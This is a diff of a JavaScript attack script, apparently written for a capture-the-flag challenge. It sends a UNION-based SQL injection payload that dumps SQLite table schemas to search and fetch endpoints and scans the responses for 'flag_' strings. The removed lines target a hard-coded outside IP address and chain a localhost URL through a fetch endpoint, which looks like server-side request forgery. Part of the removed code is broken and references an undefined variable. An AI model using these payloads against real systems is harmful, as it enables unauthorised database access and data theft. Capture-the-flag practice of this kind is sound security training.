@@ -4,29 +4,11 @@
 
 
    async function tryAllEndpoints() {
-  try {
-      const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
-      const payloadUrl = 'http://127.0.0.1:8000/search?q=' + encodeURIComponent(sqlQuery);
-
-      const resp = await fetch('/fetch', {
-       method: 'POST',
-       body: new URLSearchParams({ q: payloadUrl })
-       });
-       const data = await resp.text();
-       alert('Response: ' + data);
-
-        const searchData = await searchResp.text();
-        alert('Search endpoint response length: ' + searchData.length);
-        if (searchData.includes('') && searchData.includes('flag_')) {
-          alert('Found promising data in search response!');
-        }
-      } catch (e) {
-        alert('Error with search endpoint: ' + e.message);
-      }
-    
+   
+      // 2. Try the search endpoint with SQLi
       try {
         const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
-        const searchResp = await fetch('http://82.25.119.187:8001/search?q=' + encodeURIComponent(sqlQuery));
+        const searchResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
         const searchData = await searchResp.text();
         alert('Search endpoint response length: ' + searchData.length);
         if (searchData.includes('') && searchData.includes('flag_')) {
@@ -35,22 +17,7 @@
       } catch (e) {
         alert('Error with search endpoint: ' + e.message);
       }
-      // 3. Try the fetch endpoint
-      try {
-        const params = new URLSearchParams();
-        params.append('q', "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --");
-        const fetchResp = await fetch('http://82.25.119.187:8001/fetch', {
-          method: 'POST',
-          body: params
-        });
-        const fetchData = await fetchResp.text();
-        alert('Fetch endpoint response length: ' + fetchData.length);
-        if (fetchData.includes('') && fetchData.includes('flag_')) {
-          alert('Found promising data in fetch response!');
-        }
-      } catch (e) {
-        alert('Error with fetch endpoint: ' + e.message);
-      }
+      
     }
     tryAllEndpoints();
 
